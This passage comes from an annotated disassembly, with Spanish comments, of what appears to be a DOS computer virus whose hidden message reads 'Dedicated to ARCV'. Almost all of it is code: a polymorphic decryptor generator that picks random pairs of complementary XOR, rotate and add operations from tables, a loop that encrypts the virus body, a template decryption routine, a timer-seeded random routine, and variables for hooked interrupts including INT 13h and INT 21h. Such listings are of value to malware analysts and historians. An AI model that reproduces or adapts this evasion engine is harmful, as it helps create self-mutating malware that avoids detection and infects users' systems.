                                           ; posibles valores para AX:
                                           ; 0 4 8 12 16 20 24 28 (todo decimal)

0872 56                      PUSH SI       ; guardar SI

0873 BE E5 08                MOV SI,08E5
0876 03 F0                   ADD SI,AX     ; SI = random * 4 + 08E5h
0878 B8 01 00                MOV AX,1      ; SI apunta a la tabla (1er set)

087B E8 D2 00                CALL 0950     ; randomize AX (de 0 a 1)
087E A8 01                   TEST AL,1     ; primer bit al = 1?
0880 FC                      CLD           ; clear direction
0881 AD                      LODSW         ; copiar desde tabla de instrucciones
                                           ; una instrucci¢n

0882 74 05                   JE 0889       ; salta si el random es impar

0884 87 04                   XCHG W[SI],AX   ; invierte par de instrucciones
0886 89 44 FE                MOV W[SI-2],AX  ; de la tabla

0889 AB                      STOSW           ; copia instrucci¢n en decriptor

088A AD                      LODSW           ; lee siguiente word (instruccion
                                             ; complementaria)
088B A3 D4 08                MOV W[08D4],AX  ; lo copia a mas adelante
                                             ; para encriptar el virus

088E B8 07 00                MOV AX,7        ;
0891 E8 BC 00                CALL 0950       ; randomize AX  (de 0 a 7)
0894 D1 E0                   SHL AX,1
0896 D1 E0                   SHL AX,1        ; AX: random(7) * 4

0898 BE 05 09                MOV SI,0905
089B 03 F0                   ADD SI,AX      ; SI = random * 4 + 0905h
                                            ; va a elegir de segundo set
089D B8 01 00                MOV AX,1
08A0 E8 AD 00                CALL 0950      ; randomize AX (0 a 1)
08A3 A8 01                   TEST AL,1
08A5 74 03                   JE 08AA        ; si random es par, salta

08A7 83 EE 20                SUB SI,020     ; al azar, puede ser del
                                            ; primer set

08AA B0 01                   MOV AL,1
08AC E8 A1 00                CALL 0950      ; randomize AX (0 a 1)

08AF A8 01                   TEST AL,1

08B1 AD                      LODSW            ; copiar desde tabla de instrucciones
                                              ; una instrucci¢n

08B2 74 05                   JE 08B9          ; salta si el random es impar

08B4 87 04                   XCHG W[SI],AX    ; invierte par de instrucciones
08B6 89 44 FE                MOV W[SI-2],AX   ; de la tabla

08B9 AB                      STOSW            ; copia instrucci¢n en decriptor

08BA AD                      LODSW            ; lee siguiente word (instruccion
                                              ; complementaria)
08BB A3 D2 08                MOV W[08D2],AX   ; lo copia a mas adelante
                                              ; para encriptar el virus

08BE 5E                      POP SI          ; recupera SI
                                             ; apuntaba al JS
08BF AD                      LODSW
08C0 AD                      LODSW           ; dos words a AX (no lo usa,
                                             ; son las instr. de encripcion)

08C1 A5                      MOVSW
08C2 A5                      MOVSW           ; Copia dos words
                                             ; (DEC DI y JMP $+F5)

08C3 33 F6                   XOR SI,SI      ; SI = 0
08C5 33 C9                   XOR CX,CX      ; CX = 0
08C7 4F                      DEC DI
08C8 4F                      DEC DI         ; bajo DI en 2
08C9 EB 00                   JMP 08CB       ; jmp next
                                            ; SI apunta a principio del
                                            ; virus
                                            ; contador en 0


; ---------------- encriptar todo virus

08CB AD                      LODSW          ; copio a AX
08CC 47                      INC DI
08CD 47                      INC DI         ; incremento DI
08CE 89 05                   MOV W[DI],AX   ; copio
08D0 8B C3                   MOV AX,BX      ; copio a AX la clave de encriptado
08D2 31 05                   XOR W[DI],AX   ; encripto con operaci¢n elegida
08D4 D3 05                   ROL W[DI],CL   ; encripto con operaci¢n elegida
08D6 8B D8                   MOV BX,AX      ;
08D8 41                      INC CX
08D9 81 F9 BD 04             CMP CX,04BD
08DD 75 EC                   JNE 08CB       ; repetir 4BDh veces (1243 bytes)

08DF A3 BE 0B                MOV W[0BBE],AX  ; guardo la clave en
                                             ; offset 6 de decriptor
                                             ; queda MOV AX, clave
08E2 5D                      POP BP
08E3 5B                      POP BX
08E4 C3                      RET             ; vuelvo

; -------------------------------------- Tabla de operaciones complementarias
;                                        por pares

;      ---------------------- primer set de 8:

08E5 31 05                   XOR W[DI],AX
08E7 31 05                   XOR W[DI],AX

08E9 31 0D                   XOR W[DI],CX
08EB 31 0D                   XOR W[DI],CX

08ED 29 05                   SUB W[DI],AX
08EF 01 05                   ADD W[DI],AX

08F1 29 0D                   SUB W[DI],CX
08F3 01 0D                   ADD W[DI],CX

08F5 F7 15                   NOT W[DI]
08F7 F7 15                   NOT W[DI]

08F9 F7 1D                   NEG W[DI]
08FB F7 1D                   NEG W[DI]

08FD D1 0D                   ROR W[DI],1
08FF D1 05                   ROL W[DI],1

0901 D3 0D                   ROR W[DI],CL
0903 D3 05                   ROL W[DI],CL

; ------------------- segundo set de 8

0905 D3 C0                   ROL AX,CL
0907 D3 C8                   ROR AX,CL

0909 D1 C8                   ROR AX,1
090B D1 C0                   ROL AX,1

090D F7 D0                   NOT AX
090F F7 D0                   NOT AX

0911 F7 D8                   NEG AX
0913 F7 D8                   NEG AX

0915 D2 CC                   ROR AH,CL
0917 D2 C4                   ROL AH,CL

0919 D2 C0                   ROL AL,CL
091B D2 C8                   ROR AL,CL

091D 02 E1                   ADD AH,CL
091F 2A E1                   SUB AH,CL

0921 2A C1                   SUB AL,CL
0923 02 C1                   ADD AL,CL


; -------------------- rutina de desencripci¢n, modelo para generar

0925 0E                      PUSH CS
0926 1F                      POP DS
0927 BF 8E 09                MOV DI,098E
092A B8 00 00                MOV AX,0
092D B9 BD 04                MOV CX,04BD
0930 49                      DEC CX
0931 78 08                   JS 093B
0933 00 00                   ADD B[BX+SI],AL
0935 00 00                   ADD B[BX+SI],AL
0937 4F                      DEC DI
0938 4F                      DEC DI
0939 EB F5                   JMP 0930

; ----------------------------- mensaje secreto con XOR FF + 1

093B BC 9B 9C                  'Dedicated to ARCV... '
093E 97
093F 9D
0940 9F
0941 8C 9B 9C E0
0945 8C 91 E0 BF
0949 AE
094A BD AA D2
094D D2 D2
094F E0

; ---------------------------- randomize AX

RANDOMIZE_AX:                                   ; entrada: AX = numero
                                                ; Salida AX = random MOD (AX +1)
                                                ; Sale un numero al azar desde
                                                ; 0 al argumento (AX)

0950 51                      PUSH CX            ; Salva registros
0951 52                      PUSH DX            ;
0952 1E                      PUSH DS            ;

0953 91                      XCHG AX,CX         ; MOD en CX

0954 33 C0                   XOR AX,AX          ;
0956 8E D8                   MOV DS,AX          ;
0958 A1 6C 04                MOV AX,W[046C]     ; Lee el Timer

095B 0E                      PUSH CS            ; DS=CS
095C 1F                      POP DS             ;

095D 03 06 47 08             ADD AX,W[0847]     ; Suma posici¢n de memoria
0961 D1 C8                   ROR AX,1           ; Rota
0963 01 06 47 08             ADD W[0847],AX     ; Salva en memoria
0967 D1 C8                   ROR AX,1           ; Rota
0969 33 06 47 08             XOR AX,W[0847]     ; XOR

096D 33 D2                   XOR DX,DX          ; DX=0
096F 41                      INC CX             ;
0970 74 03                   JE 0975            ; si CX=0, salta
0972 F7 F1                   DIV CX             ; Divide por CX
0974 92                      XCHG AX,DX         ; Cociente <-> Resto

0975 1F                      POP DS             ; Recupera registros
0976 5A                      POP DX             ;
0977 59                      POP CX             ;
0978 C3                      RET

; ------------- jmp a nueva int 21h

0979 EA 90 90 90 90          JMP 09090:09090    ; JMP FAR a NEW_INT_21


; ------------- zona de variables


OLD_INT_1   DD ?              ; 097E

OLD_INT_13  DD ?              ; 0982
            DD ?              ; 0986

OLD_INT_21  DD ?              ; 098A
            DD ?              ; 098E

OLD_INT_40  DD ?              ; 0992
            DD ?              ; 0996

1ST_MEM_BLK DW ?              ; 099A

RET_ADDR    DW ?              ; 099C

FLAG_INT13 DB ?               ; 099E

BOOT_BUFF:                    ; 09B8


</->